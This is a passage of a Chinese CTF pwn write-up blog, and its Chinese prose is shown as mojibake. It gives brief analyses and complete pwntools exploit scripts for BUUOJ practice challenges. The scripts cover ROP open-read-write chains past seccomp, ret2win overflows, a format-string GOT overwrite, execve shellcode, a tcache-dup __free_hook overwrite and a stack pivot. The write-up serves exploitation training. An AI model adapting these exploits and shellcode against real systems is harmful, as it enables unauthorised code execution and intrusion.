asm(shellcraft.open(&quot;./flag&quot;))payload += asm(shellcraft.read(3,bss,0x30))payload += asm(shellcraft.write(1,bss,0x30))sl(payload)itr()</code></pre><h2 id="V-amp-N2020-å…¬å¼€èµ›warmup"><a href="#V-amp-N2020-å…¬å¼€èµ›warmup" class="headerlink" title="V&amp;N2020 å…¬å¼€èµ›warmup"></a>V&amp;N2020 å…¬å¼€èµ›warmup</h2><h3 id="åˆ†æ-6"><a href="#åˆ†æ-6" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å¼€å¯äº†æ²™ç›’ï¼Œä½¿ç”¨orwè·å–flagå³å¯ã€‚</p><pre><code>Here is my gift: 0x7f411f85c9c0 line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0011 0004: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0011 0005: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0010 0006: 0x20 0x00 0x00 0x00000024  A = count &gt;&gt; 32 # write(fd, buf, count) 0007: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0010 0008: 0x20 0x00 0x00 0x00000020  A = count # write(fd, buf, count) 0009: 0x15 0x01 0x00 0x00000010  if (A == 0x10) goto 0011 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0011: 0x06 0x00 0x00 0x00000000  return KILL</code></pre><p>å…¶ä¸­ï¼Œè¿™é¢˜å› ä¸ºåªæœ‰<code>0x10</code>çš„æº¢å‡ºç©ºé—´ï¼ŒçŒ›çš„ä¸€çœ‹éœ€è¦æ ˆè¿ç§»ï¼Œä½†æ˜¯ä¼šå‘ç°ä¸çŸ¥é“å¾€å“ªé‡Œè¿ç§»ã€‚çœ‹äº†å¸ˆå‚…ä»¬çš„åšå®¢æ‰çŸ¥é“ï¼Œç”±äºç¬¬ä¸€ä¸ªæ ˆç©ºé—´è¾ƒå¤§ï¼Œä¸”ä¸ç¬¬äºŒä¸ªå¯ä»¥æº¢å‡ºçš„æ ˆæ˜¯<strong>ç´§é‚»</strong>çš„ã€‚ç„¶åï¼Œå°±å¯ä»¥åœ¨æº¢å‡ºæ—¶è¦†ç›–ä¸€ä¸‹è¿”å›åœ°å€ï¼Œè¦†ç›–ä¸ºretï¼Œè¿™æ ·å°±å¯ä»¥å¤šä¸€ä¸ªretï¼Œä»è€Œ<strong>æ¥ç€æ‰§è¡Œ</strong>ä¸Šä¸€ä¸ªæ ˆå¸§bufé‡Œé¢æ„é€ çš„ropé“¾ã€‚</p><p>å¹¶ä¸”åœ¨orwä¸­ï¼Œopenå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ—¶ä¸€ä¸ªæŒ‡é’ˆåœ°å€(<code>*filename</code>)ï¼Œæ‰€ä»¥éœ€è¦å…ˆreadä¸€ä¸‹flagçš„æ–‡ä»¶ååˆ°ä¸€ä¸ªbufå½“ä¸­ï¼Œç„¶åå†è¿›è¡Œorwã€‚</p><p>Bufçš„å¯»æ‰¾ï¼š<br>åœ¨libcä¸­æ‰¾ä¸€ä¸ªæ²¡æœ‰ç”¨åˆ°çš„åœ°å€æ®µå³å¯ã€‚æ¯”å¦‚<code>__free_hook</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/B3tfJG.png" srcset="/img/loading.gif" alt></p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./vn_pwn_warmup&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27585)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()ru(&#39;0x&#39;)libc_base = int(r(12),16) - libc.sym[&#39;puts&#39;]info_addr(&#39;libc_base&#39;,libc_base)pop_rdi = 0x0000000000021102 + libc_basepop_rsi = 0x00000000000202e8 + libc_basepop_rdx = 0x0000000000001b92 + libc_baseopen = libc_base+libc.sym[&#39;open&#39;]read = libc_base+libc.sym[&#39;read&#39;]puts = libc_base+libc.sym[&#39;puts&#39;]buf = libc_base+libc.sym[&#39;__free_hook&#39;]payload = flat([    pop_rdi,0,pop_rsi,buf,pop_rdx,8,read,    pop_rdi,buf,pop_rsi,0,pop_rdx,0,open,    pop_rdi,3,pop_rsi,buf,pop_rdx,0x30,read,    pop_rdi,buf,puts])sa(&#39;:&#39;,payload)# debug()ret = libc_base + 0x0000000000000937payload = &#39;a&#39; * 0x78 + p64(ret)sa(&#39;?&#39;,payload)sleep(1)# debug()s(&#39;./flag\x00\x00&#39;)itr()</code></pre><h2 id="picoctf-2018-buffer-overflow-1"><a href="#picoctf-2018-buffer-overflow-1" class="headerlink" title="picoctf_2018_buffer overflow 1"></a><code>picoctf_2018_buffer overflow 1</code></h2><p>ç®€å•çš„æ ˆæº¢å‡ºï¼Œä¸”å­˜åœ¨åé—¨ã€‚</p><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./PicoCTF_2018_buffer_overflow_1&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29988)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()win = 0x080485CBoffset = 0x28 + 0x4payload = &#39;a&#39;*offset + p32(win)sa(&#39;:&#39;,payload)itr()</code></pre><h2 id="picoctf-2018-buffer-overflow-2"><a href="#picoctf-2018-buffer-overflow-2" class="headerlink" title="picoctf_2018_buffer overflow 2"></a><code>picoctf_2018_buffer overflow 2</code></h2><p>ç±»ä¼¼ä¸Šé¢˜ï¼Œè€ƒä¸ªæ§åˆ¶ä¼ å‚ã€‚</p><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./PicoCTF_2018_buffer_overflow_2&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29988)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()win = 0x80485CBoffset = 0x6c + 0x4payload = &#39;a&#39;*offset + p32(win) + p32(0xDEADBEEF) + p32(0xDEADBEEF) + p32(0xDEADC0DE)s(payload)</code></pre><h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a><code>axb_2019_fmt32</code></h2><p>32ä½çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œè€ƒçš„æ˜¯å•æ¬¡printfå¤šæ¬¡å†™å…¥ï¼Œå› ä¸ºæ˜¯32ä½pwntoolsçš„<code>fmtstr_payload</code>æ˜¯ååˆ†å¥½ç”¨çš„ã€‚</p><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./axb_2019_fmt32&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29147)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()printf_got = 0x804A014payload = &quot;%9$sA&quot; + p32(0x804A014)sla(&#39;me:&#39;,payload)ru(&#39;Repeater:&#39;)printf_got = uu32(r(4))libc_base = printf_got - 0x049020info_addr(&#39;libc_base&#39;,libc_base)offset = 8rce = libc_base + 0x3a80cinfo_addr(&#39;rec&#39;,rce)payload = &#39;a&#39; + fmtstr_payload(offset,{0x804A014:rce},write_size = &quot;byte&quot;,numbwritten = 10)sla(&#39;me:&#39;,payload)itr()</code></pre><h2 id="pwnable-start"><a href="#pwnable-start" class="headerlink" title="pwnable_start"></a><code>pwnable_start</code></h2><h3 id="åˆ†æ-7"><a href="#åˆ†æ-7" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>32ä½ï¼Œæ— ä»»ä½•ä¿æŠ¤ï¼Œä½œè€…è‡ªå·±æ±‡ç¼–å†™çš„ç¨‹åºã€‚<br>åˆ†ææ±‡ç¼–ä»¥åå¯ä»¥è®¤ä¸ºå°±æ˜¯ï¼š</p><pre><code class="c">write(1,esp,20)read(0,esp,60)</code></pre><p>ååˆ†æ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯éš¾ç‚¹åœ¨shellcodeæ‘†ä¸Šæ ˆä»¥åï¼Œå¦‚ä½•è·³è½¬è¿‡å»æ‰§è¡Œã€‚</p><p>åˆ©ç”¨æ€è·¯ï¼š</p><ul><li>åˆ©ç”¨æ§åˆ¶eipï¼Œè¿”å›wirteå¤„ï¼Œæ³„æ¼ä¸€ä¸‹æ ˆåœ°å€ï¼Œç„¶åæ ¹æ®åç§»ç®—å‡ºespçš„åœ°å€</li><li>æ‘†shellcodeä¸Šæ ˆï¼Œæ§åˆ¶å¥½eip</li></ul><h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./start&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27834)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()# debug()payload = &#39;a&#39; * 0x14 + p32(0x08048087)sa(&quot;:&quot;,payload)new_esp = uu32(r(4)) - 4addr_shellcode = new_esp + 0x14 + 4info_addr(&#39;new esp&#39;,new_esp)shellcode  = &quot;\x31\xc0\x50\x68\x2f\x2f\x73&quot;shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89&quot;shellcode += &quot;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot;shellcode += &quot;\xcd\x80\x31\xc0\x40\xcd\x80&quot;s(&#39;a&#39; * 0x14 + p32(addr_shellcode) + shellcode)itr()</code></pre><p>Shell code ç½‘ä¸Šä¸€æ‰¾æœ‰å¾ˆå¤šï¼Œæ‰¾åˆ°ä¸€ä¸ªåˆé€‚å­—èŠ‚é™åˆ¶ï¼Œä¸”å¯ä»¥æ‰§è¡Œçš„å³å¯ã€‚</p><h2 id="inndy-rop"><a href="#inndy-rop" class="headerlink" title="inndy_rop"></a><code>inndy_rop</code></h2><p>åšæ³•è·Ÿ <code>cmcc_simplerop</code>åŸºæœ¬ä¸€æ ·ï¼Œé™¤äº†åç§»ã€‚</p><p>32ä½ä¸‹ï¼Œ<code>sys_execve(&quot;sh&quot;, 0, 0, 0)</code> è¡Œä¸é€šã€‚ï¼ˆä¸Šæ¥æµ‹è¯•è¿™ä¸ªï¼Œæµ‹è¯•ä¸€é˜µå­ï¼‰</p><h2 id="BJDCTF-2nd-secret"><a href="#BJDCTF-2nd-secret" class="headerlink" title="BJDCTF 2nd secret"></a>BJDCTF 2nd secret</h2><h3 id="åˆ†æ-8"><a href="#åˆ†æ-8" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æ…¢æ…¢åˆ†æå¯ä»¥å‘ç°ä¸€ä¸ªæº¢å‡ºç‚¹ï¼Œä¸”åˆ©ç”¨æ­¤å¤„åªæ˜¯å¯ä»¥åšåˆ°ä»»æ„åœ°å€çš„æ•°æ®å‡1ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/MX0AfS.png" srcset="/img/loading.gif" alt></p><p>ç„¶åæƒ³åˆ°å¯ä»¥åœ¨gotè¡¨å¤„ä¸‹æ‰‹ï¼Œ<strong>å…¶ä¸­printfã€systemå‡½æ•°åœ¨ç¨‹åºè¾¾åˆ°ä¸€å®šæ¡ä»¶æ‰ä¼šè¿è¡Œã€‚æ‰€ä»¥å…¶gotå¤„çš„å€¼æ˜¯ç‰¹å®šçš„ï¼Œå¹¶ä¸”æ˜¯ç›¸è¿‘çš„ã€‚</strong></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/XkCKMA.png" srcset="/img/loading.gif" alt></p><p>å¦‚å›¾æ‰€ç¤ºï¼Œç›¸å·®10ã€‚ç„¶ååˆ©ç”¨åŸæ¥çš„æº¢å‡ºç‚¹ï¼Œæ”¾å…¥printfçš„gotè¡¨åœ°å€ï¼Œè®©å…¶å‡10æ¬¡1ï¼Œä¹Ÿå°±æ˜¯ç­”å¯¹10æ¬¡serectåï¼Œè®©ç¨‹åºèµ°å‘ç»“æŸå¤„ï¼Œè°ƒç”¨printfã€‚å…¶printfçš„bufæ‰“å°çš„æ˜¯nameï¼Œè¿™ä¸ªæ˜¯å¯æ§çš„ï¼Œå†™æˆ<code>/bin/sh\x00</code>å³å¯ã€‚</p><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./secret&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29635)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()payload = &#39;/bin/sh\x00&#39; + &quot;\x00&quot; * 8 + p64(elf.got[&#39;printf&#39;])[:5]#æ­¤å¤„payload å› ä¸ºreadé‚£é‡Œè¯»çš„æ•°æ®å¤§å°é™åˆ¶ï¼Œéœ€è¦è°ƒæ•´ä¸€ä¸‹payloadçš„é•¿åº¦ã€‚# debug()sla(&quot;What&#39;s your name?&quot;,payload)answer = [0x476B,0x2D38,0x4540,0x3E77,0x3162,0x3F7D,0x357A,0x3CF5,0x2F9E,0x41EA,0x48D8,0x2763,0x474C,0x3809,0x2E63]for i in range(len(answer)):    print(answer[i])    sa(&quot;Secret&quot;,str(answer[i]))sla(&quot;Secret&quot;,&#39;1&#39;)itr()</code></pre><h2 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a><code>ciscn_2019_es_1</code></h2><h3 id="åˆ†æ-9"><a href="#åˆ†æ-9" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>64ä½ï¼Œubuntu 18.  å­˜åœ¨ UAFï¼Œååˆ†ç®€å•çš„tcache dupæ”»å‡»ã€‚</p><h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./ciscn_2019_es_1&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29639)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce18 = [0x4f2c5,0x4f322,0x10a38c]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    gdb.attach(io)    pause()def add(size,name,call):    sla(&#39;ice:&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))    sa(&#39;name&#39;,str(name))    sa(&#39;call&#39;,str(call))def show(idx):    sla(&#39;ice&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))def call(idx):    sla(&#39;ice&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))add(0x500,&#39;chumen77&#39;,&#39;chumen77&#39;) #0add(0x80,&#39;chumen77&#39;,&#39;chumen77&#39;) #1# debug()call(0)show(0)ru(&#39;name:\n&#39;)libc_base = uu64(r(6)) - 0x3ebca0info_addr(&#39;libc&#39;,libc_base)#get libcadd(0x510-0x20-0x10,&#39;chumen77&#39;,&#39;chumen77&#39;) #2add(0x20,&#39;chumen77&#39;,&#39;chumen77&#39;) #3call(3)call(3)free_hook = libc_base + 0x3ed8e8add(0x20,p64(free_hook),p64(free_hook)) #4add(0x20,p64(free_hook),p64(free_hook)) #5rec = rce18[1] + libc_baseadd(0x20,p64(rec),p64(rec))call(1)itr()</code></pre><h2 id="ciscn-2019-s-4"><a href="#ciscn-2019-s-4" class="headerlink" title="ciscn_2019_s_4"></a><code>ciscn_2019_s_4</code></h2><h3 id="åˆ†æ-10"><a href="#åˆ†æ-10" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><pre><code class="c">int vul(){  char s; // [esp+0h] [ebp-28h]  memset(&amp;s, 0, 0x20u);  read(0, &amp;s, 0x30u);  printf(&quot;Hello, %s\n&quot;, &amp;s);  read(0, &amp;s, 0x30u);  return printf(&quot;Hello, %s\n&quot;, &amp;s);}</code></pre><ul><li>å­˜åœ¨æ ˆæº¢å‡ºï¼Œæº¢å‡º8ä¸ªå­—èŠ‚ï¼Œè€ƒè™‘æ ˆè½¬ç§»ã€‚</li><li>åœ¨å¡«å……bufï¼Œ <code>%s</code> åœ¨32ä½ç”¨äºæ³„æ¼æ ˆä¸Šçš„ä¿¡æ¯ã€‚</li></ul><p>æ‰€ä»¥å¯ä»¥è€ƒè™‘æ³„æ¼å¤„æ ˆåœ°å€ï¼Œlibcåœ°å€ã€‚ä»è€Œç®—å‡ºbufçš„baseä¸libc baseã€‚</p><p>é¦–å…ˆå¯ä»¥æ˜ç¡®ä¸€ç‚¹å¯ä»¥è¦†ç›–è¿”å›åœ°å€ï¼Œç¬¬ä¸€ä¸‹è€ƒè™‘ç›´æ¥è¦†ç›–ä¸º<code>one_gadget</code> æœ¬åœ°é€šè¿œç¨‹ä¸é€šã€‚</p><p>ç„¶åå°±è€ƒè™‘ç”¨æ ˆè½¬ç§»åˆ°bufä¸Šæ¥è·å–shellã€‚</p><h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./ciscn_s_4&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,26932)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()payload = &#39;a&#39; * (0x28 - 1 ) + &#39;b&#39;sa(&#39;name&#39;,payload)ru(&quot;b&quot;)buf_base = uu32(r(4)) - 0x38r(4)libc_base = uu32(r(4)) - 0x1fb9b0info_addr(&#39;stack&#39;,buf_base)info_addr(&#39;libc&#39;,libc_base)payload = p32(0x8048450) + p32(elf.plt[&#39;system&#39;]) + p32(0x8048450) + p32(buf_base+16) + &#39;/bin/sh\x00&#39;payload = payload.ljust((0x30-4-4-8),&#39;b&#39;) + p32(buf_base) *3+ p32(0x80485FD)s(payload)itr()</code></pre><h2 id="ciscn-2019-final-2"><a href="#ciscn-2019-final-2" class="headerlink" title="ciscn_2019_final_2"></a><code>ciscn_2019_final_2</code></h2><h3 id="åˆ†æ-11"><a href="#åˆ†æ-11" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ç¨‹åºå¾ˆç®€å•ï¼Œä½†æ˜¯ä¹Ÿå¾ˆç»†èŠ‚ï¼Œç”±äºè‡ªå·±çš„é€†å‘èƒ½åŠ›æœ‰ç‚¹å·®ï¼Œæ²¡æœ‰æ³¨æ„éƒ¨åˆ†ç»†èŠ‚ï¼Œé€ æˆæ„é€ å †å—ï¼Œè¿›è¡Œleakå’Œæ”¹å†™æ—¶ï¼Œé€ æˆè¾ƒå¤§çš„å›°éš¾å’Œè¿·æƒ‘ã€‚</p><p>å¼€å¯äº†æ²™ç›’ä¸èƒ½get shellï¼š</p><pre><code>#  line  CODE  JT   JF      K# =================================#  0000: 0x20 0x00 0x00 0x00000004  A = arch#  0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number#  0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005#  0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007#  0005: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0007#  0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW#  0007: 0x06 0x00 0x00 0x00000000  return KILL</code></pre><h4 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><ul><li>UAF</li></ul><p>æ¯”å¦‚ï¼š</p><h4 id="ç¨‹åºå¤„ï¼š"><a href="#ç¨‹åºå¤„ï¼š" class="headerlink" title="ç¨‹åºå¤„ï¼š"></a>ç¨‹åºå¤„ï¼š</h4><h5 id="addå‡½æ•°ï¼š"><a href="#addå‡½æ•°ï¼š" class="headerlink" title="addå‡½æ•°ï¼š"></a>addå‡½æ•°ï¼š</h5><pre><code class="c">int *v0; // rbx__int16 v1; // ax</code></pre><pre><code class="c"> v0 = (int *)int_pt; *v0 = get_atoi(); *((_DWORD *)int_pt + 2) = *(_DWORD *)int_pt;</code></pre><pre><code class="c">v1 = get_atoi();*(_WORD *)short_pt = v1;*((_WORD *)short_pt + 4) = *(_WORD *)short_pt;</code></pre><p>å¼€å§‹å¯¹æ•°æ®ç±»å‹çš„å¤§å°æ²¡æœ‰æ³¨æ„ï¼Œè¿™å‡ å¤„å†³å®šç€</p><ul><li>intå‹å †å—æ—¶ï¼Œåªèƒ½å†™ä¸Š4å­—èŠ‚çš„æ•°æ®</li><li>short int å‹å †å—æ—¶ï¼Œåªèƒ½å†™ä¸Š2å­—èŠ‚çš„æ•°æ®</li></ul><h5 id="showå‡½æ•°ï¼š"><a href="#showå‡½æ•°ï¼š" class="headerlink" title="showå‡½æ•°ï¼š"></a>showå‡½æ•°ï¼š</h5><pre><code class="c">if ( v2 == 1 &amp;&amp; int_pt )    printf(&quot;your int type inode number :%d\n&quot;, *(unsigned int *)int_pt);  if ( v2 == 2 &amp;&amp; short_pt )    printf(&quot;your short type inode number :%d\n&quot;, (unsigned int)*(signed __int16 *)short_pt);</code></pre><p>æ„å‘³ç€leakæ—¶ä¹Ÿæ˜¯åªèƒ½æ³„æ¼å‡ºéƒ¨åˆ†çš„å­—èŠ‚ï¼Œå¢åŠ åœ¨åˆ©ç”¨æ—¶çš„éš¾åº¦ï¼Œéœ€è¦åˆ©ç”¨åˆé€‚çš„å †å—è¿›è¡Œæ”»å‡»ï¼Œå…¶åˆé€‚æ˜¯æŒ‡ä¸Šé¢æœ‰æ®‹ç•™åˆé€‚çš„æ•°æ®ï¼Œç„¶åæ”¹æœ«å°¾å‡ ä¸ªå­—èŠ‚ã€‚</p><h4 id="é¢„å¤‡çŸ¥è¯†"><a href="#é¢„å¤‡çŸ¥è¯†" class="headerlink" title="é¢„å¤‡çŸ¥è¯†"></a>é¢„å¤‡çŸ¥è¯†</h4><p>scanfå‡½æ•°æ˜¯ä»stdinä¸­è¯»å–æ•°æ®ï¼Œä¸”åœ¨<code>__IO_2_stdio_</code> çš„ioç»“æ„ä½“å­˜åœ¨ä¸€ä¸ª<code>_fileno</code>çš„æ 